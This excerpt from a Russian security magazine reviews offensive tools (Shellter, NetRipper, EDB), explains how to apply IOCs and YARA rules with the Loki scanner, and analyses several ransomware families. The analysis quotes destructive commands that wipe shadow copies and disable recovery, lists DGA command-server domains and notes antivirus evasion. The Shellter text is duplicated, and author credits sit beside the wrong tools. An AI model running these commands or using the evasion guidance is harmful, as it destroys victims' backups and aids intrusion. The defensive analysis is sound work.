А если тебе еще чего-то не хватает, то это можно с легкостью дописать.
                         Автор:
                          kyREcon

                       URL:
                              www.shellterproject.com

                        Система:
                         Windows


SHELLTER
Shellter — это инструмент для динамической инъекции шелл-кода и, возможно,
первый динамический инфектор PE-файлов, когда-либо созданный. Он может
быть использован для того, чтобы инжектировать шелл-код в любое 32-битное
(пока что поддерживается только оно) нативное Windows-приложение. Шелл-
код может быть как собственный, так, например, и сгенерированный с помощью
того же Metasploit. Для своей работы Shellter использует уникальные динамиче-
ские подходы, которые основываются на потоке выполнения целевой программы.
Для этого он запускает, трассирует программу и выбирает наиболее подходящие
места для инжекта.
Особенности:
•  совместимость с Windows (XP SP3 и выше) и Wine/CrossOver для Linux/Mac;
•  не требует установки;
•  заражение PE несколькими шелл-кодами;
•  поддержка Reflective DLL loaders;
•  встроенные Metasploit Payloads;
•  polymorphic-движок;
•  использует Dynamic Thread Context информацию для усложнения статиче-
   ского анализа;
•  дизассемблирование и отображение доступных точек для инжекта.

Так что в арсенале обхода AV пополнение.
                         Автор:
                                Ionut Popescu

                       URL:
                             github.com/NytroRST/
                             NetRipper

                        Система:
                               Linux

SHELLTER
Shellter — это инструмент для динамической инъекции шелл-кода и, возможно,
первый динамический инфектор PE-файлов, когда-либо созданный. Он может
быть использован для того, чтобы инжектировать шелл-код в любое 32-битное
(пока что поддерживается только оно) нативное Windows-приложение. Шелл-
код может быть как собственный, так, например, и сгенерированный с помощью
того же Metasploit. Для своей работы Shellter использует уникальные динамиче-
ские подходы, которые основываются на потоке выполнения целевой программы.
Для этого он запускает, трассирует программу и выбирает наиболее подходящие
места для инжекта.
Особенности:
•  совместимость с Windows (XP SP3 и выше) и Wine/CrossOver для Linux/Mac;
•  не требует установки;
•  заражение PE несколькими шелл-кодами;
•  поддержка Reflective DLL loaders;
•  встроенные Metasploit Payloads;
•  polymorphic-движок;
•  использует Dynamic Thread Context информацию для усложнения статиче-
   ского анализа;
•  дизассемблирование и отображение доступных точек для инжекта.

Так что в арсенале обхода AV пополнение.
                         Автор:
                           Evan Teran

                       URL:
                             github.com/eteran/edb-debugger

                        Система:
                          Linux/FreeBSD/OpenBSD/OSX/
                         Windows

NETRIPPER
NetRipper — это инструмент для постэксплуатации Windows-систем. Инстру-
мент использует API-хуки для перехвата сетевого трафика и функций, свя-
занных с криптографией, от низко привилегированного пользователя, чтобы
захватывать трафик в открытом виде и зашифрованный трафик до его шифро-
вания или после его расшифровки.
   Основная цель данного инструмента — посмотреть сетевой трафик на ском-
прометированной машине при наличии низких привилегий в системе.
   Инструмент успешно тестировался на таких программах, как Putty, WinSCP,
SQL Server Management Studio, Lync (Skype for Business), Microsoft Outlook,
Google Chrome, Mozilla Firefox.
Основные компоненты:
•  NetRipper.exe — программа для конфигурирования и инжектирования DLL;
•  DLL.dll — инжектируемая DLL, для перехвата нужного API и сохранения дан-
   ных в файл;
•  netripper.rb — Metasploit post-exploitation модуль.

Плагины:
•  PlainText — позволяет захватывать только plain-text данные;
•  DataLimit — сохраняет только первые байты ответов и запросов;
•  Stringinder — ищет определенные строчки в трафике.

Инструмент впервые был представлен на DEF CON 23 (Лас-Вегас) в 2015 году.

EDB
Edb — это кросс-платформенный x86/x86-64-отладчик. Его создатели вдох-
новились легендарным OllyDbg, но ориентировались на работу с архитекту-
рами x86 и x64 и множеством целевых операционных систем. Пока офици-
ально есть поддержка только Linux, но портирование FreeBSD, OpenBSD, OS
X и Windows идет с различным успехом и поддержкой тех или иных функций
(специфика ОС все-таки дает о себе знать).
   Отладчик также позволяет писать собственные плагины и имеет ряд встро-
енных:
   Analyzer, Assembler, BinaryInfo, BinarySearcher, Bookmarks, BreakpointManager,
CheckVersion, DebuggerCore, DumpState, FunctionFinder, HardwareBreakpoints,
HeapAnalyzer,  OpcodeSearcher,  ProcessProperties,  ROPTool,  References,
SymbolViewer.
   Проект зависит от Qt >= 4.6 и Boost >= 1.35. В качестве движка дизассем-
блирования используется Capstone.
Устанавливается следующим образом:

$ git clone --recursive
    git@github.com:eteran/edb-debugger.git
$ qmake
$ make
$ make install

Для более подробной информации смотри
Wiki проекта.
MALWARE


 Колонка Дениса Макрушина
ЗАСТАВЬ
                                                 Денис Макрушин
                                                                                    Выпускник факультета
                                                                                 информационной
                                                                                       безопасности НИЯУ
                                                                           «МИФИ». Специализируется
                                                                                    на исследовании угроз.
                                                                                Занимался тестированиемМАЛВАРЬ         на проникновение и аудитом
                                                                                   безопасности корпоративных
                                                                                         веб-приложений,
                                                                                       стресс-тестированием
                                                                              информационных систем
                                                                                    на устойчивость к DDoS-
                                                                                          атакам, принимал участие в
                                                                                   организации и проведенииИГРАТЬ ПО          международных мероприятий
                                                                                по проблемам практической
                                                                                   безопасности @difezza, defec.
                                                                                                    ru@difezza, defec.ruПРАВИЛАМ
 Пока ты читаешь эти строки, в периметре какой-то
 организации происходит инцидент: вредоносное ПО
 под тщательным руководством киберпреступников
 ведет охоту за ценными данными жертвы — за инфор-
 мацией, утечка которой может спровоцировать круп-
 ную финансовую катастрофу или поставить под во-
 прос существование бизнеса.
Зачастую такие спецоперации могут длиться годами, и жертва может даже
не догадываться о присутствии постороннего в ее собственной ИТ-инфра-
структуре. Однако самое печальное, что о существовании, целях и средствах
злоумышленников могут уже знать эксперты, которые пристально следят
за активностью киберпреступных групп и развитием их инструментов и, кро-
ме того, участвуют в расследовании аналогичных инцидентов, где использо-
вались подобные средства. Более того, уже могут быть опубликованы матери-
алы исследований инструментов, обнаруженных при проведении той или иной
APT-атаки, и в этих материалах, кроме текста о том, как исследователь копался
в исходном коде малвари, зачастую может содержаться куда более ценная ин-
формация, которая окажется полезной для «харденинга» IT-инфраструктуры.

КОГДА НЕ УСПЕВАЮТ ПАТЧИ
Carbanak. Как много это слово значит для администратора IT-инфраструктуры
и ИБ банков. APT-кампания, о которой мы писали ранее, позволила киберпре-
ступникам провернуть кражу в размере, по предварительным оценкам, при-
ближающемуся к миллиарду долларов.
  Помимо масштаба украденного, на фоне других угроз эта APT выделяет-
ся техниками, которые злоумышленники использовали для изучения своих
жертв и закрепления в их инфраструктурах. Киберпреступники проводили
разведку в ручном режиме, пытаясь взломать нужные компьютеры (напри-
мер, компьютеры администраторов) и применяя инструменты, обеспечива-
ющие дальнейшее заражение компьютеров в сети. При этом параллельно
эксперты антивирусных компаний расследовали инциденты, за которыми
стояли участники преступной группы Carbanak, и поспешно уведомляли
жертв, у которых был обнаружены вредоносные компоненты.
   Впоследствии по результатам расследования был опубликован отчет (https://
securelist.com/files/2015/02/Carbanak_APT_eng.pdf), в котором, помимо прочей
информации, содержались так называемые индикаторы компрометации. Дан-
ные индикаторы предназначены для того, чтобы любой желающий при помо-
щи специализированных инструментов смог проверить наличие вредоносных
компонентов Carbanak в своей инфраструктуре и принять соответствующие
меры для повышения ее защищенности. Однако приложения, в которых публи-
куется данная информация, очень часто остаются без нужного внимания, по-
тому что читатель попросту не знает, что делать с различными IOC, YARA rules
и прочими структурами данных, представленных в подобных отчетах.

ОПЕРАТИВНАЯ ИНФОРМАЦИЯ
КАК СРЕДСТВО СНИЖЕНИЯ РИСКОВ
Владельцам IT-инфраструктур необходимо регулярно проверять свои инфор-
мационные ресурсы на наличие в них вредоносных компонентов, которые мо-
гут оказаться там, например, в результате эксплуатации злоумышленниками
уязвимостей нулевого дня. Но что, если о существовании подобных компонен-
тов еще не знают даже разработчики средств защиты, установленных в ин-
формационной системе? При этом в распоряжении ее владельца оказывает-
ся экспертная информация — приватный отчет о расследовании той или иной
угрозы или уже опубликованное исследование какой-либо APT.
   Типичный  отчет  содержит  приблизительно следующую информацию
об APT-кампании:
•  детали о цели и жертвах;
•  время активности;
•  перечень узлов (IP-адреса) жертв;
•  текущая активность;
•  показатели компрометации (IOC, YARA rules);
•  инструменты, которые использовали злоумышленники;
•  описания инфраструктуры командных центров (C&C);
•  MD5-хеши вредоносных компонентов.

Среди технической информации о деталях проведения той или иной APT-кам-
пании для администратора безопасности информационной системы наи-
больший практический интерес представляют «показатели компрометации».
Данная структурированная информация предназначена для импорта в авто-
матизированные средства проверки инфраструктуры на наличие признаков
заражения.

ПОКАЗАТЕЛИ КОМПРОМЕТАЦИИ
Показатель компрометации (indicator of compromise, IOC) — это артефакт, ко-
торый при помощи специальных утилит позволяет определить факт зараже-
ния и может находиться как на конкретном узле сети, так и в сетевом трафи-
ке. Унифицированный формат описания данных индикаторов по-прежнему
остается открытым вопросом, однако в индустрии широкое распространение
и поддержку получили несколько типов структурированных данных.

IOC
IOC — данные для записи, определения и распространения информации
об угрозах, позволяющие определить ее наличие в инфраструктуре посред-
ством автоматизированного анализа программными средствами.
   Простые сценарии использования подразумевают поиск специфичных
файлов в системе по различным признакам: MD5-хешу, имени файла, дате
создания, размеру и прочим атрибутам. Кроме того, можно искать различные
специфичные признаки в памяти или специфичные записи в реестре операци-
онной системы Windows.
   Администратор также может интегрировать IOC, взятые из отчетов, в раз-
личные защитные решения:
•  средства защиты класса Endpoint Security;
•  SIEM;
•  IDS/IPS;
•  HIDS/HIPS.

Инструменты для расследования инцидентов
Существует множество коммерческих решений для работы с IOC, однако в ряде
случаев достаточно возможностей их «опенсорсных» аналогов для проверки
целевой системы на наличие признаков заражения. Например, Loki — IOC-ска-
нер, распространяющийся по лицензии GPL, который позволяет искать в це-
левой системе различные артефакты в результате вредоносной активности.





Перечень MD5-хешей компонентов Carbanak APT в файле hash-iocs сканера Loki


Для проверки системы достаточно распаковать архив с утилитой и добавить
нужные IOC-атрибуты. В папке приложения signature находятся следующие ка-
тегории IOC:
•  filename-iocs — текстовый файл, в котором содержатся списки атрибутов фай-
   ловой системы, являющихся результатом активности той или иной угрозы;
•  hash-iocs — перечень MD5, SHA-1 и SHA-256 хешей вредоносных компо-
   нентов, которые присутствуют в системе после ее заражения;
•  falsepositive-hashes — список исключений MD5, SHA-1 и SHA-256 хешей,
   которые при детекте соответствующих компонентов помечаются сканером
   как ложное срабатывание.

В качестве примера возьмем опубликованный отчет об исследовании APT
Carbanak (https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf). На стра-
нице 36 данного отчета содержится перечень MD5-хешей всех вредоносных
компонентов, которые могут оказаться в системе после ее заражения. Откро-
ем файл hash-iocs сканера и внесем соответствующее правило в следующем
формате: <MD5>;<description>.
   Затем в текстовом файле filename-iocs, описывающем атрибуты вредонос-
ных компонентов в файловой системе, создадим индикатор в формате

# COMMENT
# REGULAREXPRESSION;SCORE





OC для файловой системы в перечне filename-iocs сканера Loki

                                                           Процесс сканирова-
                                                           ния утилитой Loki
После внесения нужных индикаторов в базу знаний сканера можно приступить
к сканированию. Для этого необходимо запустить исполняемый файл loki.
exe с правами администратора (в противном случае у сканера не будет воз-
можности проверить содержимое оперативной памяти на наличие атрибутов)
и дождаться завершения процедуры.
  По результатам сканирования приложение составит отчет, который будет
находиться в каталоге с программой и называться loki.txt.

Yara rules
Помимо IOC-индикаторов, к отчетам могут прилагаться файлы с расширением
yar. В них содержатся правила, составленные согласно специальному синтакси-
су, для YARA — инструмента, предназначенного для идентификации и класси-
фикации вредоносных семплов. Так называемые YARA rules описывают признаки
наличия малвари. В том случае, если выполняется одно из правил, анализатор
выносит вердикт о заражении и конкретных экземплярах вредоносного ПО.
   Сканер Loki также поддерживает YARA-правила, а значит, взятые из отчетов
yar-файлы могут стать хорошим поводом для проверки своей системы на нали-
чие угрозы, упомянутой в отчете. Для этого достаточно переместить yar-файл
в папку signature и запустить проверку. Однако для работы с YARA-правилами
куда лучше подходит официальный инструмент от создателей проекта YARA,
так как его база знаний регулярно пополняется и она куда больше, чем базы
аналогичных утилит, что позволяет в результате сканирования получить более
полную картину защищенности инфраструктуры.
  Для проверки наличия тех или иных вредоносных компонентов в инфра-
структуре на рабочей станции достаточно запустить утилиту YARA с нужными
параметрами. Например:

yara32.exe –d md5=<MD5_hash> <this_is_yara_rule.yar> <dir_for_check>

где параметр -d используется для определения внешних переменных. При со-
ответстви условиям правила утилита выведет уведомление с названием пра-
вила и компонент, на котором оно сработало.





Пример сработавшего правила YARAw

В результате администратор может запланировать запуск подобных прове-
рок, например при загрузке системы. Для этого достаточно написать простой
PowerShell-скрипт, который будет запускать утилиты с нужными параметрами
и, если потребуется, назначать его запуск для всех хостов при помощи Active
Directory: User configuration -> Windows configuration -> Scenarios ->Logon.

STIX/JSON
Structured  Threat  Information Expression  (STIX) — унифицированный язык
для структурированной записи информации об угрозах. STIX разработан
для эффективного применения данных об угрозах и используется для задач
анализа вредоносного ПО, составления индикаторов, оперативного реагиро-
вания на инциденты и публикации информации об угрозах.
  Огромное количество защитных решений поддерживают правила STIX
и JSON для развертывания их в инфраструктуре, в их числе:
•  SIEM;
•  защитные решения, основанные на индикаторах (например, сканеры);
•  forensic-платформы;
•  решения класса Endpoint Security и прочее.

STIX-отчета можно импортировать в популярное SIEM-решение IBM QRadar,
используя специально подготовленный Python-скрипт:

./stix_import.py -f STIXDocument.xml -i 192.168.56.2
    -t XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX -r MyReferenceSet

где -f определяет расположение локального STIX-документа, -i определяет
хост с установленной QRadar-консолью, -t задает сервис-токен для QRadar.
  JSON — один из наиболее популярных форматов представления данных,
который также часто прилагается к отчетам. Применение данных в формате
JSON зависит от задач администратора и особенностей программного ре-
шения, в которое импортируются эти данные. Например, если есть IP-адреса
командных центров, к которым подключаются зараженные рабочие станции,
администратору защищаемой инфраструктуры имеет смысл внести эти IP-а-
дреса в черный список своего файрвола.

КТО ВЛАДЕЕТ ИНФОРМАЦИЕЙ, ТОТ...
Данный материал должен еще раз напомнить (а для кого-то и открыть) читателям
нашего ресурса тот факт, что отчеты об исследовании той или иной угрозы не-
сут в себе куда больше полезной информации, чем может показаться на первый
взгляд. Они должны быть полезны не только для администратора, который вы-
нужден постоянно искать актуальную информацию об угрозах, но и для защища-
емой им инфраструктуры, которая должна оперативно реагировать на появление
новых угроз. Ведь, в конце концов, кто владеет информацией, тот снижает риски
быть взломанным.
ВОПРОС ДЛЯ ДЕНИСА.
Вышла десятая винда. Насколько объективно опасно сейчас сидеть под
Windows XP, если учесть, что я не сижу под админом и у меня стоит Google
Chrome и адекватный продукт класса Internet Security? Интересно неангажи-
рованное мнение Дениса Макрушина :).
   Система больше не поддерживается разработчиком (только, возможно,
в рамках индивидуальных контрактов), а это значит, что 0day-уязвимости оста-
нутся там навсегда — никто не будет их патчить. И здесь не поможет Google
Chrome, потому что рейтинги по количеству «зиродеев» возглавляют другие,
не менее популярные продукты (привет, Adobe!). В данном случае тебя дей-
ствительно может спасти хороший продукт класса Internet Security, где име-
ются технологии защиты от эксплоитов или Default Deny технологии, которые
не дадут заразе запуститься даже в случае, если она окажется на рабочей
станции (например, попадет через USB-носитель).
  В качестве конкретного примера возьмем drive-by атаки и какой-нибудь
зловред семейства вымогателей (Trojan-Ransom), которые часто распростра-
няются злодеями посредством 100500-day сплоитов к прикладному ПО. Если
сплоит к PDF, то Chrome не даст злодеям загрузить троянца по той причине,
что все PDF-доки по умолчанию этот браузер запускает в собственной читал-
ке, которая, в свою очередь, находится в песочнице браузера. В том случае,
если сплоит, например, к Flash, то антивирусный продукт с активной техноло-
гией защиты от эксплоитов определит подозрительное поведение. Это значит,
что drive-by в данном случае не сработает.
   Однако если этот троянец попадет на рабочую станцию посредством MitM-а-
таки (злодей подменит скачиваемый жертвой бинарь), то велика вероятность
его успешного запуска. В случае с шифровальщиком толковый антивирус за-
метит подозрительную активность (операции открытия файлов с популярными
у шифровальщика расширениями на запись и изменения его структуры требуют
предварительного бэкапа) и не даст зловреду выполнить свою функцию. Однако
в случае со сложным шпионским ПО ситуация может быть совершенно другая.
   Тем не менее ни один разработчик средства защиты никогда не даст сто-
процентной гарантии защищенности пользователя (0day в защитных продук-
тах и недостатки их конфигурации никто не отменял, и, кроме того, не только
drive-by атаки служат средством доставки малвари), тем более пользовате-
ля, который сам делает все для того, чтобы малварь оказалась на компьюте-
ре. Именно поэтому регулярно обновляй стороннее ПО, которое использу-
ешь, обновляй базы антивирусного продукта, настрой файрвол, меняй пароли
и будь параноиком.
MALWARE





                                                               Евгений Дроботун
                                                                             drobotun@xakep.ruДЕТИ
ЛЕЙТЕНАНТА
CRYPTOLOCKER’A

ВСКРЫВАЕМ DIRCRYPT, TORLOCKER, TESLACRYPT,
TORRENTLOCKER, CRITRONI И CRYPTOWALL
Первые образцы малвари, шифрующей файлы, а затем требующей денег
за расшифровку, появились очень давно. Достаточно вспомнить Trojan.Xorist
с его примитивным алгоритмом шифрования на базе XOR или написанный
на PureBasic Trojan.ArchiveLock, который использовал для шифрования обычный
WinRAR, а для удаления зашифрованных файлов Sysinternals SDelete и требо-
вал за расшифровку целых пять тысяч долларов. Однако именно CryptoLocker





Требование как минимум пяти тысяч долларов за расшифровку от Trojan.ArchiveLock
основал в среде вирусописателей нехорошую тенденцию — использовать са-
мые последние достижения криптографии в виде весьма стойких алгоритмов
шифрования. Сегодня мы исследуем несколько троянов-шифровальщиков,
появившихся после нашумевшего шествия по интернету CryptoLocker’а (или
в одно время с ним).

НЕМНОГО СТАТИСТИКИ
С точки зрения создателей, трояны-шифровальщики — это реальные живые
деньги. Организовать спам-рассылку зараженных писем и сервис приема
платежей от тех, кому дороги семейные фотографии, которые вдруг оказались
зашифрованными, намного проще и дешевле, чем, например, старательно
строить и развивать ботнет (который потом еще нужно будет куда-нибудь при-
строить) или собирать данные с зараженных машин, учитывая, что эти собран-
ные данные надо тоже как-то монетизировать.
   Поэтому такой вид кибервымогательства продолжает процветать и при-
носить огромные деньги организаторам этого криминального бизнеса. На-
пример, по данным специалистов «Лаборатории Касперского», за 2014 год
зафиксировано более семи миллионов атак с использованием троянов-шиф-
ровальщиков различных семейств.



                                                           Количество атак
                                                                   с использованием
                                                               троянов-
                                                      шифровальщиков
                                                                за 2014 год по данным
                                                          «Лаборатории
                                                             Касперского»
                                                            Распределение атак
                                                                     с использованием
                                                                троянов-
                                                        шифровальщиков
                                                               в первом квартале
                                                                  2015 года по странам
                                                            (информация
                                                                     от компании
                                                                   TrendLabs)





Большая часть этого добра попадает на компьютеры своих потенциаль-
ных жертв под видом каких-либо полезных и крайне необходимых вложений
в спам-рассылках (если помнишь, именно так и распространялся в свое время
CryptoLocker). Однако последователи CryptoLocker’а не стали ограничивать-
ся только этим каналом распространения своих творений и подключили еще
один — путем drive-by загрузок (к примеру, трояны-шифровальщики Alpha
Crypt и CryptoWall очень часто распространяются с помощью известных на-
боров эксплоитов Angler EK или Nuclear EK).





Angler EK и Nuclear EK, заподозренные в распространении трояна-шифровальщика
CryptoWall и TeslaCrypt на malware-traffic-analysis.net
CRITRONI (CTB LOCKER)
Этот представитель локеров-шифровальщиков появился около года назад.
CTB — аббревиатура, обозначающая Curve-Tor-Bitcoin. Основное отличие
этого локера от многих других заключается в использовании для шифрования
файлов алгоритма, основанного на эллиптических кривых.





Объявление о продаже Critroni (CTB-Locker) на одном из форумов


В реестре в ветках автозапуска он называет себя вполне благопристойно.
Например, два семпла, которые мы исследовали, выдавали себя за экран-
ную клавиатуру от Microsoft. Для сокрытия внутренностей от посторонних глаз
и затруднения анализа файл зловреда упакован с помощью PEncrypt 3.1.

Шифрование файлов
Critroni шифрует не так много типов файлов, в основном это документы MS
Office, текстовые документы и файлы баз данных:

.xlsx .xlsm .xlsb .xls .xlk .txt .sql .safe .rtf .pwm .pem .mdf
.mdb .kwm .groups .docx .docm .doc .der .dbf .db .crt .cer
Critroni (CTB-Locker) в ветках автозапуска реестра


Шифрование файлов идет в несколько этапов:
•  отобранный для шифрования файл с помощью API-функции MoveFileEx по-
   мещается во временный файл;
•  этот временный файл считывается с диска поблочно;
•  каждый считанный блок сжимается с помощью функции deflate библиотеки zlib;
•  сжатый блок шифруется и записывается на диск;
•  в начало файла помещается информация, которая нужна будет для рас-
   шифровки;
•  зашифрованный файл получает расширение ctbl.

CTB-Locker использует для своей деятельности так называемый алгоритм
Диффи — Хеллмана на эллиптических кривых (ECDH — Elliptic curve Diffie —
Hellman).
  Для начала Critroni генерирует пару главных ключей master-public и master-
private. Для этого берется хеш SHA-256 от 34-байтного случайного числа, со-
стоящего из:
•  0x14 bytes: значение, полученное функцией CryptGenRandom
•  0x08 bytes: значение, полученное функцией GetSystemTimeAsFileTime
•  0x04 bytes: значение, полученное функцией GetTickCount
•  0x04 bytes: значение (ThreadID ^ ProcessID)
•  0x10 bytes: значение MachineGuid

Ключ master-private отправляется на командный сервер и на зараженной ма-
шине не сохраняется (при этом он также шифруется с использованием ECDH,
и подсмотреть его во время пересылки не получится). Для каждого шифру-
емого файла таким же образом генерируются session-public и session-private.
После этого вычисляется значение session-shared =  ECDH(master-public,
session-private), хеш SHA-256 от которого используется в качестве клю-
ча для шифрования файлов алгоритмом AES-256. В начало зашифрованно-
го файла пишется 32 байта session-public и 16 байт служебной информации
для поиска нужного master-private на командном сервере.
  В итоге без знания master-private расшифровать файлы не получится, а ключ
этот, как мы уже выяснили, хранится на C&C-сервере в доменной зоне .onion.





Результат деятельности Critroni

Связь с командным сервером
В образцах, которые попали на исследование в (анти)вирусную лабораторию
нашего журнала, C&C-центр располагался в сети Tor, а само доменное имя
зашито в теле трояна. Связь устанавливается посредством Tor-клиента, за-
пускаемого в отдельном потоке. Весь код, реализующий обмен с командным
сервером в зоне .onion, взят практически без изменений из исходников широ-
ко известного tor.exe.
Кусочек Tor-клиента внутри Critroni
(выделены адрес командного сервера и пересылаемые команды)


CRYPTOWALL
Массовое распространение этой малвари было зафиксировано в первом
квартале 2014 года, однако, по некоторым данным, первые образцы были
обнаружены еще в ноябре 2013 года. В этом семействе известны и две вер-
сии CryptoWall 2.0 и CryptoWall 3.0. На сегодняшний день версия 3.0 (несмо-
тря на утрату некоторых возможностей по сравнению с предыдущей верси-
ей) почти полностью вытеснила версию 2.0. По некоторым данным, за первые
полгода своей деятельности CryptoWall принес своим создателям свыше 1,1
миллиона долларов.

Шифрование файлов
Список шифруемых файлов довольно широк, этого локера стоит опасаться
не только владельцам документов MS Office и фотографий, но и разработчи-
кам софта:

.c .h .m .ai .cs .db .nd .pl .ps .py .rm .3dm .3ds .3fr .3g2 .3gp
.ach .arw .asf .asx .avi .bak .bay .cdr .cer .cpp .cr2 .crt .crw
.dbf .dcr .dds .der .des .dng .doc .dtd .dwg .dxf .dxg .eml .eps
.erf .fla .flvv .hpp .iif .jpe .jpg .kdc .key .lua .m4v .max .mdb
.mdf .mef .mov .mp3 .mp4 .mpg .mrw .msg .nef .nk2 .nrw .oab .obj
.odb .odc .odm .odp .ods .odt .orf .ost .p12 .p7b .p7c .pab .pas
.pct .pdb .pdd .pdf .pef .pem .pfx .pps .ppt .prf .psd .pst .ptx
.qba .qbb .qbm .qbr .qbw .qbx .qby .r3d .raf .raw .rtf .rw2 .rwl
.sql .sr2 .srf .srt .srw .svg .swf .tex .tga .thm .tlg .txt .vob
.wav .wb2 .wmv .wpd .wps .x3f .xlk .xlr .xls .yuv .back .docm .docx
.flac .indd .java .jpeg .pptm .pptx .xlsb .xlsm .xlsx

Первым делом CryptoWall делает невозможным восстановление файлов из те-
невых копий и точек восстановления, выполняя следующие команды:

vssadmin.exe Delete Shadows /All /Quiet
bcdedit.exe /set {default} recoveryenabled No
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures

Шифрование начинается после того, как от C&C-сервера будет получен пу-
бличный RSA-ключ. В отличие от других локеров, CryptoWall шифрует сами фай-
лы с использованием алгоритма RSA-2048, в то время как большинство дру-
гих с помощью RSA шифруют AES-ключ, которым были зашифрованы файлы.
Алгоритм RSA достаточно ресурсоемкий и создает большую нагрузку на си-
стему, что может косвенно указывать на заражение CryptoWall’ом.

Связь с командным сервером
В зависимости от модификации связь с командными серверами может уста-
навливаться либо посредством Tor (для этого скачивается и устанавливает-
ся tor.exe), либо через анонимную сеть I2P. Все имена командных серверов
прошиты непосредственно в теле троя, а передаваемые данные шифруются
по алгоритму RC4.

Приемы, затрудняющие анализ
Код троя подвергнут тщательному многоуровневому шифрованию. В ходе
первой стадии расшифровки трой читает большой кусок зашифрованного
кода, расшифровывает и сохраняет его в буфер. Второй этап расшифровки
кода начинается с байтового массива (0x35, 0x5e, 0x74) внутри сохраненного
на первом этапе кода. Как только это место определено, данные расшифро-
вываются в стек. Третий этап начинается передачей выполнения на код, кото-
рый был помещен в стек. Во время этого этапа расшифровываются ресурсы,
зашифрованные с помощью Base64. Расшифрованный ресурс — это и есть
окончательный код CryptoWall.
  В версии 2.0 на втором этапе троян проверяет наличие виртуального окру-
жения или песочницы: ищет процессы VBoxService.exe, vmtoolsd.exe или загру-
женную библиотеку sbieDLL.dll.
CryptoWall 2.0 определяет VirtualBox


Помимо всего перечисленного, при запуске трой создает фейковый процесс
explorer.exe, в который пишет свой код, запускает его отдельным потоком,
а свой процесс завершает. Фейковый explorer.exe, в свою очередь, запускает
vssadmin.exe и bcedit.exe для уничтожения теневых копий и точек восстановле-
ния системы, а также фейковый svchost.exe, в который тоже внедряется вре-
доносный код, и уже под видом этого процесса CryptoWall начинает свою дея-
тельность.
Последовательность запуска процессов локера CryptoWall


 DIRTY (DIRCRYPT)
Появился примерно в одно время с CryptoLocker’ом (некоторые антивирусные
компании датируют появление Dirty даже немного раньше — в июле 2013 года).





Устрашающие обои Dirty
Шифрование файлов
DurCrypt шифрует не так много типов файлов, в основном это документы и фо-
тографии:

.7z .avi .doc .docm .docx .jpeg .jpg .mpeg .mpg
.pdf .png .rar .rtf .wmv .xls .xlsm .xlsx .zip

Для шифрования используются два алгоритма: RC4 и RSA. Первым алгорит-
мом шифруется весь файл целиком, причем ключ шифрования дописывает-
ся в конец зашифрованного файла. Вторым алгоритмом шифруются первые
1024 байта файла с использованием публичного ключа, зашитого в теле ло-
кера, при этом ключ для расшифровки можно только получить из командного
центра, заплатив сумму, эквивалентную 200 долларам.

Связь с командным сервером
Dirty сам генерирует имена командных серверов на основе двух четырех-
байтовых начальных чисел, находящихся в секции ресурсов. Всего алгоритм
генерации доменных имен может сгенерировать тридцать имен командных
центров. Все командные центры находятся в зоне .com и имеют вот такие сом-
нительные с художественной точки зрения имена: rauggyguyp.com, llullzza.com,
mluztamhnngwgh.com, mycojenxktsmozzthdv.com, inbxvqkegoyapgv.com.





Работа генератора имен C&C-сервера Dirty
Связь с командным центром ведется открытым текстом без всякого шифрова-
ния, передается публичный ключ и после подтверждения факта оплаты в ответ
высылается RSA-ключ для расшифровки.

Приемы, затрудняющие анализ
В процессе своей работы Dirty ищет процессы с именами taskmgr, tcpview,
filemon, procexp, procmon, regmon, wireshark, LordPE, regedit и в случае успеха
завершает обнаруженные «опасные» процессы.
  Помимо этого, все текстовые строки и другие данные хранятся в теле локе-
ра в зашифрованном виде.





Расшифрованные строки внутри Dirty


 TESLACRYPT
Первые образцы этой малвари появились в ноябре 2014 года (первый сем-
пл был загружен на virustotal.com 11 ноября 2014 года). Однако широко и по-
всеместно TeslaCrypt стал распространяться чуть позже, в начале марта 2015
года. За все время своего существования этот локер претерпел ряд измене-
ний, и на данный момент актуальной версией следует считать TeslaCrypt 2.0.0.
Окно с требованием оплаты TeslaCrypt версии 0.4.0 (RSA-2048 написано
для устрашения, в реальности используется AES-256-CBC)

Шифрование файлов
TeslaCrypt выбирает для шифрования очень много типов файлов (порядка
двухсот), при этом в список попали и типы файлов, связанные с играми (сохра-
нения, пользовательские профили и прочее):
•  Bethesda Softworks settings file
•  F.E.A.R. 2 game
•  Steam NCF Valve Pak
•  Call of Duty
•  EA Sports
•  Unreal 3
•  Unity scene
•  Assassin’s Creed game
•  Skyrim animation
•  Bioshock 2
•  Leagues of Legends
•  DAYZ profile file
• RPG Maker VX RGSS
•  World of Tanks battle
•  Minecraft mod
•  Unreal Engine 3 game file
•  Starcraft saved game
•  S.T.A.L.K.E.R. game file
•  Dragon Age Origins game

Сама схема шифрования претерпевала изменения от версии к версии. Изна-
чально это была реализация алгоритма AES-256-CBC, с сохранением ключа
расшифровки в файле key.dat до конца зашифровывания всех файлов (после
шифрования последнего файла этот ключ затирался нулями).
  В более поздних версиях (в частности, 0.4.0) ключ расшифровки сохранял-
ся в файле storage.bin уже не в открытом виде, а в преобразованном с помо-
щью алгоритма цифровой подписи с эллиптическими кривыми (реализация
под названием secp256k1) и после зашифровывания последнего файла зати-
рался случайными байтами.
  В последних версиях (TeslaCrypt 2.0.0) алгоритм шифрования стал гораздо
более совершенным. Скорее всего, авторы этого троя подсмотрели реализа-
цию шифрования у Critroni и практически без изменений перенесли ее в свое
творение. Все алгоритмы реализованы с помощью свободно распространяе-
мой библиотеки cryptlib предположительно версии 3.4.1 (в теле локера встре-
чаются строки с названиями файлов исходников из этой библиотеки: bn_lib.c,
ec_lid.c, ec_key.c и другие). Отличие реализации алгоритмов в TeslaCrypt
от их реализации в CTB-Locker’е в том, что сессионные ключи генерируются
не для каждого файла, а для текущей сессии компьютера (до следующей пе-
резагрузки).
  Перед шифрованием файлов TeslaCrypt удаляет все системные бекапы (те-
невые копии) файлов жертвы с помощью команды

vssadmin.exe delete shadows /all /quiet

Необходимую для работы информацию TeslaCrypt 2.0.0 сохраняет в реестре (а
не в файлах, как это было ранее). В HKCU\Software\msys\ID сохраняется зна-
чение идентификатора троя, а в HKCU\Software\<идентификатор  троя>\data
сохраняется номер Bitcoin-кошелька, публичный ключ master-public, разде-
ляемый секрет алгоритма ECDH и другая служебная информация (при этом
ни master-private, ни session-private нигде не сохраняются).
Что такое vssadmin.exe

Vssadmin.exe — это утилита управления службой теневого копирования VSS
(Volume Snapshot Service или Volume Shadow Copy Service). Данная служба ис-
пользуется в стандартном процессе восстановления системы и различных
программах резервного копирования/архивации данных (Handy Backup, Leo
